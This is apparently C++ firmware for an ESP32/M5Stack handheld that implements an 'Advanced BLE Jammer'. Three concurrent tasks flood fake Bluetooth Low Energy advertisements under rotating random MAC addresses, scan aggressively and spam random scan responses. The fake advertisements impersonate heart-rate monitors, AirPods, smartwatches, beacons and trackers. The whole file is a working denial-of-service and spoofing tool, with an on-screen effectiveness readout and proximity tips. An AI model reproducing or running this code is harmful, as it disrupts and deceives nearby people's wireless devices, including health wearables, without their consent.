#include "ble_jammer.h"
#include "config.h"
#include "settings.h"
#include "keyboard.h"
#include "ui.h"
#include "menu.h"
#include <Arduino.h>
#include <M5Unified.h>
#include <vector>
#include <esp_bt.h>
#include <esp_bt_main.h>
#include <esp_gap_ble_api.h>
#include <esp_gattc_api.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>

#define JAMMER_ADV_INTERVAL_MIN 0x20   
#define JAMMER_ADV_INTERVAL_MAX 0x20   
#define JAMMER_PAYLOAD_LEN      31     
#define MAX_SCAN_RESULTS        32     
#define NUM_FAKE_PATTERNS       8

static volatile bool jammer_running  = false;
static volatile unsigned long pkt_count = 0;
static volatile unsigned long scan_count = 0;
static volatile unsigned long attack_count = 0;
static esp_ble_adv_params_t adv_params;

typedef struct {
    uint8_t bda[6];           
    int rssi;                 
    String name;              
    bool is_connected;        
} ble_device_t;

static ble_device_t found_devices[MAX_SCAN_RESULTS];
static int device_count = 0;

static const uint8_t pattern_health[] = {
    0x02, 0x01, 0x06, 0x03, 0x03, 0x0D, 0x18,
    0x0A, 0x09, 0x48, 0x65, 0x61, 0x72, 0x74, 0x52, 0x61, 0x74, 0x65
};

static const uint8_t pattern_fitness[] = {
    0x02, 0x01, 0x06, 0x03, 0x03, 0x0F, 0x18, 0x03, 0x03, 0x1E, 0x18,
    0x07, 0x09, 0x46, 0x69, 0x74, 0x62, 0x69, 0x74, 0x31
};

static const uint8_t pattern_headphone[] = {
    0x02, 0x01, 0x06, 0x03, 0x03, 0x0B, 0x18,
    0x0F, 0x09, 0x41, 0x69, 0x72, 0x50, 0x6F, 0x64, 0x73, 0x2D, 0x41, 0x42, 0x31, 0x32, 0x33
};

static const uint8_t pattern_watch[] = {
    0x02, 0x01, 0x05, 0x03, 0x03, 0x0D, 0x18, 0x03, 0x15, 0xFF,
    0x08, 0x09, 0x47, 0x61, 0x6C, 0x61, 0x78, 0x79, 0x57, 0x61
};

static const uint8_t pattern_beacon[] = {
    0x02, 0x01, 0x06, 0x1A, 0xFF, 0x4C, 0x00, 0x02, 0x15,
    0xE2, 0xC5, 0x6D, 0xB5, 0xDF, 0xAB, 0x76, 0xC9,
    0xA4, 0xE2, 0x2A, 0x21, 0x91, 0x3F, 0xA3, 0xEF,
    0x00, 0x01, 0x00, 0x02
};

static const uint8_t pattern_sensor[] = {
    0x02, 0x01, 0x06, 0x03, 0x03, 0x18, 0x18, 0x03, 0x03, 0x28, 0x18,
    0x09, 0x09, 0x54, 0x65, 0x6D, 0x70, 0x53, 0x65, 0x6E, 0x73
};

static const uint8_t pattern_tracker[] = {
    0x02, 0x01, 0x06, 0x03, 0x03, 0xFE, 0xAA, 0x16, 0x16, 0xFE, 0xAA,
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
    0x10, 0x11, 0x12, 0x13
};

static const uint8_t pattern_noise[] = {
    0x02, 0x01, 0x04, 0x08, 0xFF, 0xFF, 0xFF,
    0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,
    0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88,
    0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00
};

struct PatternDef {
    const uint8_t *data;
    uint8_t len;
};

static const PatternDef patterns[NUM_FAKE_PATTERNS] = {
    {pattern_health, sizeof(pattern_health)},
    {pattern_fitness, sizeof(pattern_fitness)},
    {pattern_headphone, sizeof(pattern_headphone)},
    {pattern_watch, sizeof(pattern_watch)},
    {pattern_beacon, sizeof(pattern_beacon)},
    {pattern_sensor, sizeof(pattern_sensor)},
    {pattern_tracker, sizeof(pattern_tracker)},
    {pattern_noise, sizeof(pattern_noise)}
};

static void generateRandomMAC(uint8_t *mac) {
    for (int i = 0; i < 6; i++) {
        mac[i] = (uint8_t)(esp_random() & 0xFF);
    }
    mac[5] |= 0xC0;
}

static void preparePayload(uint8_t *buf, const PatternDef *pattern) {
    memset(buf, 0, JAMMER_PAYLOAD_LEN);
    
    if (pattern->len <= JAMMER_PAYLOAD_LEN) {
        memcpy(buf, pattern->data, pattern->len);
        for (uint8_t i = pattern->len; i < JAMMER_PAYLOAD_LEN; i++) {
            buf[i] = (uint8_t)(esp_random() & 0xFF);
        }
    } else {
        memcpy(buf, pattern->data, JAMMER_PAYLOAD_LEN);
    }
    
    if (buf[0] == 0x02 && buf[1] == 0x01) {
        if (esp_random() % 10 == 0) {
            buf[2] = 0x04 | (esp_random() & 0x08);
        }
    }
}

static String macToString(const uint8_t *mac) {
    char buf[18];
    sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X",
            mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(buf);
}

static bool deviceExists(const uint8_t *mac) {
    for (int i = 0; i < device_count && i < MAX_SCAN_RESULTS; i++) {
        if (memcmp(found_devices[i].bda, mac, 6) == 0) return true;
    }
    return false;
}

static void addDevice(const uint8_t *mac, int rssi, const char *name) {
    if (deviceExists(mac)) return;
    if (device_count >= MAX_SCAN_RESULTS) return;
    
    memcpy(found_devices[device_count].bda, mac, 6);
    found_devices[device_count].rssi = rssi;
    found_devices[device_count].name = name ? String(name) : "";
    found_devices[device_count].is_connected = false;
    device_count++;
    scan_count++;
}

static void gap_event_handler(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param) {
    switch (event) {
        case ESP_GAP_BLE_SCAN_RESULT_EVT: {
            if (!jammer_running) break;
            
            esp_ble_gap_cb_param_t *scan_result = (esp_ble_gap_cb_param_t *)param;
            
            if (scan_result->scan_rst.search_evt == ESP_GAP_SEARCH_INQ_RES_EVT) {
                
                uint8_t *bda = scan_result->scan_rst.bda;
                int rssi = scan_result->scan_rst.rssi;
                char *name = NULL;
                
                
                if (scan_result->scan_rst.ble_adv != NULL) {
                    uint8_t adv_len = scan_result->scan_rst.adv_data_len;
                    if (adv_len == 0) adv_len = scan_result->scan_rst.scan_rsp_len;
                    
                    uint8_t *eir = (uint8_t *)scan_result->scan_rst.ble_adv;
                    
                    for (uint8_t i = 0; i < adv_len && i < 62; ) {
                        uint8_t field_len = eir[i];
                        if (field_len == 0) break;
                        
                        uint8_t field_type = eir[i + 1];
                        if (field_type == 0x09 && field_len > 1) {  
                            name = (char *)&eir[i + 2];
                            break;
                        }
                        i += field_len + 1;
                    }
                }
                
                addDevice(bda, rssi, name);
            }
            break;
        }
        
        case ESP_GAP_BLE_SCAN_PARAM_SET_COMPLETE_EVT:
            Serial.println("[JAMMER] Scan Parameter gesetzt");
            break;
            
        default:
            break;
    }
}

static void scanTask(void *pv) {
    Serial.println("[JAMMER] Scan Task gestartet");
    
    while (jammer_running) {
        
        esp_ble_scan_params_t scan_params;
        scan_params.scan_type = BLE_SCAN_TYPE_ACTIVE;  
        scan_params.own_addr_type = BLE_ADDR_TYPE_RANDOM;
        scan_params.scan_filter_policy = BLE_SCAN_FILTER_ALLOW_ALL;
        scan_params.scan_interval = 0x04;  
        scan_params.scan_window = 0x04;    
        
        
        esp_ble_gap_set_scan_params(&scan_params);
        delay(10);
        esp_ble_gap_start_scanning(2);  
        
        
        vTaskDelay(pdMS_TO_TICKS(2500));
        
        
        esp_ble_gap_stop_scanning();
        vTaskDelay(pdMS_TO_TICKS(500));
    }
    
    Serial.println("[JAMMER] Scan Task beendet");
    vTaskDelete(NULL);
}

static void floodTask(void *pv) {
    uint8_t raw_adv_data[JAMMER_PAYLOAD_LEN];
    uint8_t raw_scan_rsp_data[JAMMER_PAYLOAD_LEN];
    int current_pattern = 0;
    int pattern_repeat = 0;
    
    Serial.println("[JAMMER] Flood Task gestartet");
    
    while (jammer_running) {
        if (pattern_repeat <= 0) {
            current_pattern = esp_random() % NUM_FAKE_PATTERNS;
            pattern_repeat = 5 + (esp_random() % 15);
            
            uint8_t new_mac[6];
            generateRandomMAC(new_mac);
            esp_ble_gap_set_rand_addr(new_mac);
        }
        pattern_repeat--;
        
        preparePayload(raw_adv_data, &patterns[current_pattern]);
        
        for (int i = 0; i < JAMMER_PAYLOAD_LEN; i++) {
            raw_scan_rsp_data[i] = (uint8_t)(esp_random() & 0xFF);
        }
        
        esp_err_t ret = esp_ble_gap_config_adv_data_raw(raw_adv_data, JAMMER_PAYLOAD_LEN);
        if (ret != ESP_OK) {
            vTaskDelay(pdMS_TO_TICKS(5));
            continue;
        }
        
        esp_ble_gap_config_scan_rsp_data_raw(raw_scan_rsp_data, JAMMER_PAYLOAD_LEN / 2);
        
        ret = esp_ble_gap_start_advertising(&adv_params);
        if (ret == ESP_OK) {
            pkt_count++;
        }
        
        vTaskDelay(pdMS_TO_TICKS(8));
        esp_ble_gap_stop_advertising();
        vTaskDelay(pdMS_TO_TICKS(2));
    }
    
    esp_ble_gap_stop_advertising();
    Serial.println("[JAMMER] Flood Task beendet");
    vTaskDelete(NULL);
}

static void spamTask(void *pv) {
    Serial.println("[JAMMER] Spam Task gestartet");
    
    while (jammer_running) {
        
        
        uint8_t fake_scan_rsp[31];
        for (int i = 0; i < 31; i++) {
            fake_scan_rsp[i] = (uint8_t)(esp_random() & 0xFF);
        }
        
        esp_ble_gap_config_scan_rsp_data_raw(fake_scan_rsp, 31);
        attack_count++;
        
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    
    Serial.println("[JAMMER] Spam Task beendet");
    vTaskDelete(NULL);
}

static bool bleInitForJamming() {
    Serial.println("[JAMMER] Initialisiere BLE Controller...");
    
    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    
    esp_err_t ret = esp_bt_controller_init(&bt_cfg);
    if (ret != ESP_OK) {
        Serial.println("[JAMMER] Controller init fehlgeschlagen: " + String(ret));
        return false;
    }
    
    ret = esp_bt_controller_enable(ESP_BT_MODE_BTDM);
    if (ret != ESP_OK) {
        
        ret = esp_bt_controller_enable(ESP_BT_MODE_BLE);
        if (ret != ESP_OK) {
            Serial.println("[JAMMER] Controller enable fehlgeschlagen: " + String(ret));
            esp_bt_controller_deinit();
            return false;
        }
    }
    
    ret = esp_bluedroid_init();
    if (ret != ESP_OK) {
        esp_bt_controller_disable();
        esp_bt_controller_deinit();
        return false;
    }
    
    ret = esp_bluedroid_enable();
    if (ret != ESP_OK) {
        esp_bluedroid_deinit();
        esp_bt_controller_disable();
        esp_bt_controller_deinit();
        return false;
    }
    
    
    ret = esp_ble_gap_register_callback(gap_event_handler);
    if (ret != ESP_OK) {
        Serial.println("[JAMMER] GAP Callback fehlgeschlagen: " + String(ret));
        
    }
    
    Serial.println("[JAMMER] BLE initialisiert!");
    return true;
}

static void bleDeinitFull() {
    esp_ble_gap_stop_scanning();
    esp_ble_gap_stop_advertising();
    delay(50);
    esp_bluedroid_disable();
    delay(50);
    esp_bluedroid_deinit();
    delay(50);
    esp_bt_controller_disable();
    delay(50);
    esp_bt_controller_deinit();
    Serial.println("[JAMMER] BLE deinitialisiert");
}

static void startJammer() {
    if (jammer_running) return;

    drawMainBorder(true);
    M5.Display.setTextSize(FM);
    M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
    M5.Display.setCursor(BORDER_PAD_X, BORDER_PAD_Y + 10);
    M5.Display.print("Starting BLE Jammer...");
    
    Serial.println("\n\n[JAMMER] ==========================================");
    Serial.println("[JAMMER] === ADVANCED BLE JAMMER STARTING ===");
    Serial.println("[JAMMER] ==========================================\n");
    
    if (!bleInitForJamming()) {
        displayError("BLE Init failed!\nBT hardware error?", true);
        return;
    }

    
    device_count = 0;
    memset(found_devices, 0, sizeof(found_devices));

    
    memset(&adv_params, 0, sizeof(adv_params));
    adv_params.adv_int_min   = JAMMER_ADV_INTERVAL_MIN;
    adv_params.adv_int_max   = JAMMER_ADV_INTERVAL_MAX;
    adv_params.adv_type      = ADV_TYPE_NONCONN_IND;
    adv_params.own_addr_type = BLE_ADDR_TYPE_RANDOM;
    adv_params.channel_map   = ADV_CHNL_ALL;
    adv_params.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;

    jammer_running = true;
    pkt_count = 0;
    scan_count = 0;
    attack_count = 0;

    
    xTaskCreatePinnedToCore(floodTask, "bleFlood", 4096, NULL, tskIDLE_PRIORITY + 3, NULL, 0);
    xTaskCreatePinnedToCore(scanTask, "bleScan", 4096, NULL, tskIDLE_PRIORITY + 2, NULL, 0);
    xTaskCreatePinnedToCore(spamTask, "bleSpam", 4096, NULL, tskIDLE_PRIORITY + 2, NULL, 0);

    
    unsigned long start_ms = millis();
    unsigned long last_stat = start_ms;

    waitAllKeysReleased();
    
    while (jammer_running) {
        M5.update();
        pollKeyboard();
        
        if (check(EscPress)) {
            jammer_running = false;
            uiBeep(440, 30);
            waitAllKeysReleased();
            break;
        }
        
        if (millis() - last_stat >= 500) {
            last_stat = millis();
            unsigned long elapsed = (millis() - start_ms) / 1000;
            unsigned long pkts = pkt_count;
            float rate = (elapsed > 0) ? (pkts * 1000.0f / (millis() - start_ms)) : 0;

            M5.Display.fillScreen(kitenConfig.bgColor);
            drawMainBorder(false);
            
            M5.Display.setTextSize(FM);
            M5.Display.setTextColor(TFT_RED, kitenConfig.bgColor);
            M5.Display.setCursor(BORDER_PAD_X, BORDER_PAD_Y);
            M5.Display.print(">> BLE JAMMER ACTIVE <<");
            
            M5.Display.drawFastHLine(
                BORDER_PAD_X, BORDER_PAD_Y + LH*FM + 2,
                SCREEN_WIDTH - 2*BORDER_PAD_X, TFT_RED
            );
            
            int y = BORDER_PAD_Y + LH*FM + 8;
            M5.Display.setTextSize(FP);
            M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
            
            M5.Display.setCursor(BORDER_PAD_X, y); y += LH + 2;
            M5.Display.print("Time: " + String(elapsed) + "s");
            
            M5.Display.setCursor(BORDER_PAD_X, y); y += LH + 2;
            M5.Display.print("Flood Pkt: " + String(pkts));
            
            M5.Display.setCursor(BORDER_PAD_X, y); y += LH + 2;
            M5.Display.print("Rate: " + String(rate, 0) + " p/s");
            
            M5.Display.setCursor(BORDER_PAD_X, y); y += LH + 2;
            M5.Display.print("Devices Found: " + String(device_count));
            
            M5.Display.setCursor(BORDER_PAD_X, y); y += LH + 2;
            M5.Display.print("Spam Pkt: " + String(attack_count));
            
            y = SCREEN_HEIGHT - LH*FP - 12;
            M5.Display.setTextColor(TFT_YELLOW, kitenConfig.bgColor);
            M5.Display.setCursor(BORDER_PAD_X, y);
            M5.Display.print("[ESC] to STOP");
        }
        
        markActivity();
        delay(5);
    }

    
    Serial.println("\n[JAMMER] Stoppe Jammer...");
    
    delay(200);
    bleDeinitFull();
    
    jammer_running = false;
    unsigned long total_ms = millis() - start_ms;
    float avg_rate = (total_ms > 0) ? (pkt_count * 1000.0f / total_ms) : 0;
    
    String summary = String("=== JAMMER STOPPED ===\n\n") +
                     "Duration: " + String(total_ms / 1000) + "s\n" +
                     "Flood packets: " + String(pkt_count) + "\n" +
                     "Avg rate: " + String(avg_rate, 0) + " p/s\n" +
                     "Devices found: " + String(device_count) + "\n" +
                     "Scan Response Spam: " + String(attack_count) + "\n\n" +
                     "Note: Effectiveness depends on:\n" +
                     "- Device proximity (<5m ideal)\n" +
                     "- Target device type\n" +
                     "- Bluetooth stack implementation";
    
    displayInfo(summary, true);
    Serial.println(summary);
    Serial.println("[JAMMER] === END ===");
}

void bleJammerMenuEntry() {
    std::vector<Option> warnOpts = {
        {"Start Jammer", []() { startJammer(); }},
        {"Cancel", []() {}},
    };
    
    displayWarning("ADVANCED BLE JAMMER\n\nThis uses 3 simultaneous attacks:\n\n" \
                   "1. ADVERTISING FLOOD\n   (Fake devices on all channels)\n" \
                   "2. AGGRESSIVE SCANNING\n   (Interferes with discovery)\n" \
                   "3. SCAN RESPONSE SPAM\n   (Confuses scanners & devices)\n\n" \
                   "Effectiveness varies by device!", false);
    
    loopOptions(warnOpts, MENU_TYPE_SUBMENU, "BLE Jammer Warning");
}
